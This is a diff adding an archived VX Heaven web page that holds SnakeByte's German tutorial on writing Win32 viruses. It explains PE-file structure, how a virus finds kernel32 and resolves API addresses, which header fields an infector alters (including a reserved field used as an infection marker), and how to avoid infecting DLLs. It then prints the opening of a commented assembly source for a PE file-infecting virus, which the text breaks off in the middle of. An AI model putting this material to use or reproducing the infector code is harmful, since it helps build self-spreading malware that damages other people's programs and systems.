@@ -1,0 +1,999 @@
+<?xml version="1.0"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+<head>
+<title> SnakeByte 'Win32 Viren' (VX heaven)</title>
+<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
+<meta name="Author" content="SnakeByte"/>
+<meta name="KeyWords" lang="en" content="computer virus, virus, virii,vx, компьютерные вирусы, вирус, вири, SnakeByte,Win32 Viren, sektion, kernel, größe, call, wieder, data, datei, code, push, dateien, dword, mzaddy, infizieren, filetime, carriage"/>
+<meta name="Description" content="Endlich ist es soweit und ich habe wieder etwas Zeit für ein Tutorial. Diesmal geht es um Viren unter Windows. Nach so einem Tutorial wurde ich des öfteren gefragt, da es um einiges &quot;aktueller&quot; ist als Dos-Viren. Was gibt es also neues?"/>
+<script type="text/javascript">
+//<![CDATA[
+try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"047a5bcbf67431883fc9ed25fba33612",petok:"088357df56fac7bbbf9deec0d3ce90a82994a890-1498757829-1800",zone:"vxheaven.org",rocket:"a",apps:{}}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=85b614c0f6/cloudflare.min.js"><'+'\/script>');}}catch(e){};
+//]]>
+</script>
+<link rel="icon" href="/favicon.ico" type="image/x-icon"/>
+<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
+<link rel="stylesheet" type="text/css" href="/style.css"/><link rel="canonical" href="http://vxheaven.org/lib/vsn03.html"/>
+<script type="text/rocketscript" data-rocketsrc="https://apis.google.com/js/plusone.js">{"parsetags": "explicit"}</script>
+</head>
+<body bgcolor="#dbc8a0" text="#302000" link="#225599" vlink="#113366">
+<div class="s1">
+<div style="float:right;"><a href="/lib/index.php?tbs=1"><img src="/img/max.gif" alt="Maximize"/></a></div> <form id="lf" style="margin: 0; float: right;" method="get" action="/index.php"><input type="hidden" name="action" value="set"/><select name="lang" onchange="javascript:document.getElementById('lf').submit();"><option value="ru">Русский</option><option selected="selected" value="en">English</option><option value="ua">Українська</option><option value="de">Deutsch</option><option value="es">Español</option><option value="fr">Fran&ccedil;ais</option><option value="it">Italiano</option><option value="pl">Polski</option></select></form>
+<div style="float: right;"><div id="plusone"></div></div>
+<script type="text/rocketscript">gapi.plusone.render("plusone", {"size":"small","count":"true"});</script>
+<div style="float: right;" class="addthis_toolbox addthis_default_style">
+<script type="text/rocketscript">var addthis_config = { ui_click: true }</script>
+<a style="text-decoration: none; font-size: 10pt;" href="/?action=addthis" class="addthis_button_compact">Bookmark</a>
+<script type="text/rocketscript" data-rocketsrc="http://s7.addthis.com/js/250/addthis_widget.js#username=herm1t"></script>
+</div>
+<div style="float: right;">
+<script type="text/rocketscript" data-rocketsrc="http://www.google.com/cse/brand?form=cse-search-box&amp;lang=en"></script>
+<form action="/search.php" id="cse-search-box">
+<input type="hidden" name="cx" value="002577580816726040001:z9_irkorydo"/>
+<input type="hidden" name="cof" value="FORID:10"/>
+<input type="hidden" name="ie" value="UTF-8"/>
+<input type="text" name="q" size="12" value=" "/>
+<input type="submit" name="sa" value="Search"/>
+</form>
+</div><h1><a href="/" style="text-decoration: none; color: #000000;">VX Heaven</a></h1>
+<span class="nav"><a href="/lib/">Library</a> <a href="/vl.php">Collection</a> <a href="/src.php">Sources</a> <a href="/vx.php?id=eidx">Engines</a> <a href="/vx.php?id=tidx">Constructors</a> <a href="/vx.php?id=sidx">Simulators</a> <a href="/vx.php?id=uidx">Utilities</a> <a href="/links.php">Links</a> <a href="/donate.php" style="color: #706020" id="donate">Donate</a> <a href="/forum" style="text-decoration: underline;">Forum</a> </span><br clear="all"/>
+</div>
+<div class="s2"><h1>Win32 Viren</h1><p><a href="/lib/?lang=de&amp;author=SnakeByte"> SnakeByte</a><br/></p><script type="text/rocketscript">var disqus_url = 'http://vxheaven.org/lib/vsn03.html';</script>[<a style="" href="/lib/?lang=DE&amp;index=WI#vsn03">zurück zum Index</a>] [<a href="/lib/vsn03.html#disqus_thread">Kommentare</a>]<br/> 
+<p>Endlich ist es soweit und ich habe wieder etwas Zeit für ein Tutorial. Diesmal geht es um Viren unter Windows. Nach so einem Tutorial wurde ich des öfteren gefragt, da es um einiges "aktueller" ist als Dos-Viren. Was gibt es also neues?</p>
+<ol>
+<li>Win32-Bit Assembler</li>
+<li>Die Api's</li>
+<li>PE-Exe Format</li>
+</ol>
+<h2>1) Win32-Bit Assembler</h2>
+<p>Die Programmiersprache ist etwas anders, es gibt jetzt 32-Bit Register die durch ein vorangestelltes 'e' gekennzeichnet werden (eax, ebx, ecx.. ) Die alten Register sind aber weiterhin nutzbar. Dazu kommen die API's, die die alten Interrupts ersetzen. Auch ist es nun nicht mehr möglich direkt auf Geräte ( Lautsprecher etc ) zuzugreifen, da normalerweise alle Programme auf Ring-3 ebene laufen. Das System selber und alle Gerätetreiber ( .Vxd ) laufen auf Ring-0 und haben dieses Privileg. Auch die SEH's ( Structural Error Handler ) schränken die Freiheit unter Windows ein, diese Fenster werden dann angezeigt, wenn zum Beispiel durch Null geteilt wird oder man auf nicht freigegebene Speicherbereiche zugegriffen wird. Borland TASM 5.0 eignet sich auch weiterhin als Compiler / Linker, allerdings müssen nun TASM32 und TLINK32 verwendet werden. TD32 ist der entsprechende Debugger. Das soll an dieser Stelle erstmal alles zu Win32-Bit Programmierung sein, ich bin allerdings dabei ein Win32-ASM Tutorial vorzubereiten ( kann aber noch etwas dauern.. ;)</p>
+<h2>2) Die Api's</h2>
+<p>Wie eben schon erwähnt ersetzen die API's die alten Interrupts. Wo unter DOS die INT's bzw. die Anfangsaddressen im Speicher lagen ist klar (INT-Nr. * 4), allerdings konnten sie auch direkt über einen Opcode wie z.B. INT 03h (0CCH) aufgerufen werden, so das man sich um die Addressen nicht zu kümmern brauchte. In Windows ist dies allerdings anders. Die API's sind exportierte Funktionen aus den verschiedensten DLL-Dateien (Kernel32.dll und User32.dll sind die am häufigsten gebrauchten ) Wenn Windows nun beim hochfahren die Kernel32.dll lädt, ist diese unter Win9x an einem festen Punkt, jedoch nicht unter NT. Wiso ist die Addresse wichtig ? Den API's ist unter Windows nicht ein fester Opcode zugeordnet, wie dies unter DOS mit den Int's der Fall ist. Beim Ausführen einer PE-Exe wird in der Import-Table der EXE gelesen und dann in einen festgelegten Bereich die Addressen der API's geschrieben. Im Code ist dann ein call zu dieser Addresse. z.B.:</p>
+<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#91;</span><span style="color: #339933;">...</span><span style="color: black;">&#93;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; MessageBoxA &nbsp; &nbsp; <span style="color: black; font-style: italic;">; wir rufen den API auf</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#91;</span><span style="color: #339933;">...</span><span style="color: black;">&#93;</span><br/>
+MessageBoxA<span style="color: #339933;">:</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jmp</span> &nbsp; &nbsp; xxxxxxxx&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; dies ist ein Sprung in die User32.dll, die diesen API enthält</span><br/>
+&nbsp;</div>
+<p>Das xxxxxxxx wird dann beim Start durch den Anfangspunkt des API's im Speicher ersetzt. Wie kommt nun ein Virus an die Startaddressen der API's im Kernels? Man braucht im Grunde nur 2 API's um alle anderen zu erhalten:</p>
+<dl>
+<dt>GetProcAddress</dt><dd>Gibt den Anfangspunkt einer beliebigen DLL</dd>
+<dt>GetModuleHandle</dt><dd>Gibt den Anfangspunkt eines API's</dd>
+</dl>
+<p>Beide API's sind in der Kernel32.dll vorhanden. Zuerst versuchte man durch fixe Werte der Kernel32.dll diese API's zu ermitteln, jedoch führte die unter den verschiedenen Windows-Versionen zu Fehlern. Danach ging man dazu über die beiden aus der Import-Table der eigenen, infizierten Datei zu ermitteln, jedoch schlug dies fehl wenn die EXE diese beiden API's nicht verwendete. Nun aber zu dem besten Weg um an die Anfangsaddresse der Kernel32.dll zu kommen um dann in ihrer Export-Tabelle nach den beiden API's zu suchen. Wenn eine Datei ausgeführt wird geschieht dies über den CreateProcess API, der auch in der Kernel32.dll enthalten ist. Wenn eine Datei nun ausgeführt wird, liegt der Rücksprungspunkt zu dieser Prozedur auf dem Stack.</p>
+<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>486P<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>Model&nbsp; <span style="color: #0000ff; font-weight: bold;">Flat</span> <span style="color: #339933;">,</span>StdCall<br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; extrn &nbsp; ExitProcess<span style="color: #339933;">:</span>PROC&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; Hier deklarieren wir die benötigten API's</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; ExitProcess beendet die Ausführung</span><br/>
+<span style="color: #0000ff; font-weight: bold;">.Data</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span>&nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">0h</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; der Bereich für die Daten</span><br/>
+<span style="color: #339933;">.</span><span style="color: #0000ff; font-weight: bold;">Code</span><br/>
+Main<span style="color: #339933;">:</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; hier springen wir zurück in den CreateProcess</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; End &nbsp; &nbsp; Main<br/>
+&nbsp;</div>
+<p>Dieser Code läuft einwandfrei und kehrt einfach direkt nach dem Start zurück in den CreateProcess. Zuerst holen wir nun die Addresse aus dem Stack und runden sie, da DLL's immer an runde Speicherpostitionen geladen werden.</p>
+<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esp</span><span style="color: black;">&#93;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">xor</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">ax</span><br/>
+&nbsp;</div>
+<p>Nun haben wir in eax möglicherweise die Addresse des Kernels. Dies testen wir, indem wir auf das altbekannte "MZ" testen, das auch die PE-EXE Dateien, wie sie DLL's auch sind einleitet. Mehr Code dazu später...</p>
+<h2>3) PE-Exe Format</h2>
+<p>Unter Windows gibt es ein neues Dateiformat, die PE-EXE. Nur zur Information: Win 3.1 und die Vorgänger hatten schon ein neues Format, die NE (New Executable) Exe Datei, aber diese war für uns nicht so wichtig ;) Die PE-Exe wird unter Windows nicht nur für EXE-Dateien sondern auch für .scr, .dll, .vxd, .ocx... verwendet. Die PE-Exe (Portable Executable) hat, hat grob folgende Struktur:</p>
+<ul>
+<li>Dos-Stub</li>
+<li>PE-Header</li>
+<li>Section-Table</li>
+<li>Code / Daten / etc.. (die einzelnen Sections)</li>
+</ul>
+<p>Fangen wir vorne an. Der Dos-Stub ist genau das gleiche wie der DOS-Exe Header, er ist dazu da, damit die Dateien auch unter Dos ausführbar bleiben und dem verduzten User mitgeteilt wird "This program cannot be run in DOS mode", damit er weiß das er es hier mit einer Windows Datei zu tun hat (Kann auch anders lauten, ist vom Compiler zu Compiler verschieden.) Der Dos Header interessiert uns eigentlich nur nebensächlich, da er uns den Start des PE-Headers angibt und das MZ-Zeichen enthält. An Offset 3Ch des Dos-Stubs finden wir das Offset des PE-Headers. Dieses Offset des PE-Headers ist auch vom Compiler abhängig. Auch das MZ sollte vor einer Infektion überprüft werd, damit sicher ist das es sich um eine EXE-Datei handelt. (evtl. noch testen ob der erhaltene Offset auch innerhalb der Datei liegt und sie nicht evtl. beschädigt ist). Der PE-Header fängt mit einem 'PE',0h,0h an (also 50540000h). Dieses müsst ihr überprüfen, wenn ihr nicht bei alten (Dos / NE) Exe-Dateien in Probleme geraten wollt. Hier einfach mal alle wichtigen Stellen des PE-Headers, ich werde nachher auf die einzelnen noch einmal eingehen. Die Offsets sind alle relativ zum Anfang des PE Headers!</p>
+<table summary="">
+<tr><td>00h</td><td>Magic Value ("PE",0,0)</td></tr>
+<tr><td>06h</td><td>Number of Sections</td></tr>
+<tr><td>16h</td><td>Characteristics</td></tr>
+<tr><td>28h</td><td>Entrypoint (Initial EIP)</td></tr>
+<tr><td>34h</td><td>Image Base</td></tr>
+<tr><td>38h</td><td>Section Alignment</td></tr>
+<tr><td>4Ch</td><td>Reserved (0)</td></tr>
+</table>
+<dl>
+<dt>Magic Value ("PE",0,0)</dt><dd>Sollte klar sein, habe ich oben schon erklärt.</dd>
+<dt>Number of Sections</dt><dd>Die Anzahl der einzelnen Abschnitte der Datei (Code, Data, Whatever .. ;) Wir brauchen diese Anzahl, um den Section Header des letzten Abschnittes zu ermitteln, da wir in diesen unseren Virus schreiben wollen.</dd>
+<dt>Characteristics</dt><dd>Gibt an, ob es sich evtl. um eine DLL Datei handelt. Diese sollten wir nicht infizieren.
+<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bx</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: black;">&#93;</span>&nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; edi zeigt auf das Feld</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">and</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bx</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">0F000h</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; wir checken nur das DLL Feld</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cmp</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bx</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">02000h</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; bleib eine 200 übrig</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">je</span>&nbsp; &nbsp; &nbsp; GotaDLL &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; haben wir eine DLL</span><br/>
+&nbsp;</div></dd>
+<dt>Entrypoint</dt><dd>Das ist der Punkt an dem der Code anfängt (später unser Virus)</dd>
+<dt>Image Base</dt><dd>Wenn eine EXE Datei geladen wird, wird sie von Windows an den Speicherbereich geladen, der hier angegeben ist. Alle andereren Adressangaben im Header sind immer relativ zum Anfang der Datei. Wenn die Datei geladen wird wird die Imagebase zu den Adressen addiert, so das man die Adresse im Speicher enthält. (Wenn wir die Datei in den Speicher laden müssen wir diese Werte natürlich auch angleichen)</dd>
+<dt>Section Alignment</dt><dd>Dies ist der Wert auf den die Sektionen &amp; die Datei gerundet werden müssen.</dd>
+<dt>Reserved (0)</dt><dd>Ein unbenutztes Feld, perfekt für unsere Infektionsmarke ;)</dd>
+</dl>
+<p>Ok, nun etwas zur Section Table. Die Section Table enthält Informationen über den Abschnitt der Datei. So können zum Beispiel Flags gesetzt werden, ob der Abschnitt lesbar, beschreibbar oder ausführbar ist. (Die .Code Sektion ist normalerweise <em>nicht</em> beschreibbar !) Diesmal sind die Offsets relativ zum Start der Section Table.</p>
+<table summary="">
+<tr><td>08h</td><td>Virtual Size (Größe der Sektion)</td></tr>
+<tr><td>0Ch</td><td>Virtual Address (Start der Sektion)</td></tr>
+<tr><td>10h</td><td>Size of Raw Data</td></tr>
+<tr><td>14h</td><td>Pointer to Raw Data</td></tr>
+<tr><td>24h</td><td>Characteristics (Flags)</td></tr>
+</table>
+<dl>
+<dt>Virtual Size</dt><dd>Echte Größe der Sektion</dd>
+<dt>Virtual Address</dt><dd>Wenn man die Startadresse einer Sektion im Speicher herausfinden will, addiert man zu diese Adresse, die Imagebase</dd>
+<dt>Size of Raw Data</dt><dd>Gerundete Größe der Sektion</dd>
+<dt>Pointer to Raw Data</dt><dd>Offset der Sektion in relation zum Anfang der Datei</dd>
+<dt>Characteristics</dt><dd>Dieses Feld enthält Flags, die angeben, was mit dieser Sektion geschehen darf. Hier einmal die für uns wichtigen:
+<table summary="">
+<tr><td>20h</td><td>Code</td></tr>
+<tr><td>20000000h</td><td>darf ausgeführt werden</td></tr>
+<tr><td>40000000h</td><td>lesbar</td></tr>
+<tr><td>80000000h</td><td>beschreibbar</td></tr>
+</table></dd>
+</dl>
+<p>Welche dieser Felder sollte ein Virus normalerweise ändern?</p>
+<ul>
+<li>PE-Header: Entrypoint, Reserved</li>
+<li>Sec-Table: Virtual Size, Size of Raw Data, Characteristics</li>
+</ul>
+<p>Das sollte soweit als Erklärung reichen, hier mal den Quellcode eines simplen Viruses, ich hoffe die Kommentare sollten alles weitere erklären.</p>
+<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: black; font-style: italic;">; ***************************************************************************</span><br/>
+<span style="color: black; font-style: italic;">; ---------------------------[ Hier starten wir ]----------------------------</span><br/>
+<span style="color: black; font-style: italic;">; ***************************************************************************</span><br/>
+<br/>
+<span style="color: #339933;">.</span>586p<br/>
+<span style="color: #339933;">.</span>model <span style="color: #0000ff; font-weight: bold;">flat</span><br/>
+jumps &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; Jumps werden berechnet</span><br/>
+<span style="color: #339933;">.</span>radix <span style="color: #ff0000;">16</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; Alle Nummern sind Hexadezimal</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; ein paar API's</span><br/>
+extrn ExitProcess<span style="color: #339933;">:</span>PROC &nbsp; &nbsp; <span style="color: black; font-style: italic;">; Fake-host für die 1. Generation</span><br/>
+<br/>
+extrn MessageBoxA<span style="color: #339933;">:</span>PROC &nbsp; &nbsp; <span style="color: black; font-style: italic;">; Zum Testen, damit man nicht immer gleich zum debugger</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; greifen muss</span><br/>
+<br/>
+<span style="color: #0000ff; font-weight: bold;">.data</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; Pseudo-Data, da TASM dies hier sonst nicht</span><br/>
+&nbsp;<span style="color: #0000ff; font-weight: bold;">db</span> ? &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; kompilieren würde, wir speichern alle Daten in der</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; Code Sektion. Aus diesem Grund müssen wir nach dem</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; Compilieren PEWRSEC benutzen damit wir auch Lesezugriff</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; auf die Code Sektion haben !</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; Zwei Konstanten die ich nicht selber berechnen will ;)</span><br/>
+&nbsp;VirusSize &nbsp;<span style="color: #0000ff; font-weight: bold;">equ</span> <span style="color: black;">&#40;</span>offset VirusEnd <span style="color: #339933;">-</span> offset Virus <span style="color: black;">&#41;</span><br/>
+&nbsp;Buffersize <span style="color: #0000ff; font-weight: bold;">equ</span> <span style="color: black;">&#40;</span>offset EndBufferData <span style="color: #339933;">-</span> offset VirusEnd <span style="color: black;">&#41;</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; Struktur die wir für die FindFirstFile / Next brauchen</span><br/>
+&nbsp;FILETIME &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #0000ff; font-weight: bold;">STRUC</span><br/>
+&nbsp;FT_dwLowDateTime &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #0000ff; font-weight: bold;">dd</span> &nbsp; &nbsp; &nbsp; ?<br/>
+&nbsp;FT_dwHighDateTime &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dd</span> &nbsp; &nbsp; &nbsp; ?<br/>
+&nbsp;FILETIME &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;ENDS<br/>
+<br/>
+<span style="color: #339933;">.</span><span style="color: #0000ff; font-weight: bold;">code</span><br/>
+<br/>
+<span style="color: black; font-style: italic;">; ***************************************************************************</span><br/>
+<span style="color: black; font-style: italic;">; -----------[ Delta Offset Berechnung und suchen nach dem Kernel ]----------</span><br/>
+<span style="color: black; font-style: italic;">; ***************************************************************************</span><br/>
+<br/>
+<br/>
+Virus<span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; Hier starten wir</span><br/>
+<br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">call</span> Delta &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; Alte Methode um den Delta Offset zu berechnen,</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; damit die Offsets relativ sind</span><br/>
+Delta<span style="color: #339933;">:</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">pop</span> <span style="color: #46aa03; font-weight: bold;">ebp</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; durch den Call legen wir die momentane Adresse auf den Stack</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">sub</span> <span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">,</span> offset Delta &nbsp; &nbsp; <span style="color: black; font-style: italic;">; subtrahieren, die Originaladresse und errechnen so unseren</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; Relationsfaktor in ebp</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; Wir speichern diese beiden Werte ( EIP &amp; Imagebase )</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; um später zu dem Code der infizierten Datei springen zu können</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>OldEIP<span style="color: black;">&#93;</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>retEIP<span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">eax</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>OldBase<span style="color: black;">&#93;</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>retBas<span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">eax</span><br/>
+<br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esp</span><span style="color: black;">&#93;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; wir lesen die return Adresse des Create Process API aus dem</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">xor</span> <span style="color: #46aa03; font-weight: bold;">si</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">si</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; Stack und runden ihn auf eine volle Page</span><br/>
+<br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">call</span> GetKernel &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; Prozedur die den Kernel testet</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">jnc</span> GetApis &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; Falls wir den Kernel haben, suchen wir nach den API's</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; Wenn nicht, suchen wir nach dem Kernel</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; an mehreren fixen Adressen</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; Doch sollte der obige Weg meistens klappen</span><br/>
+<br/>
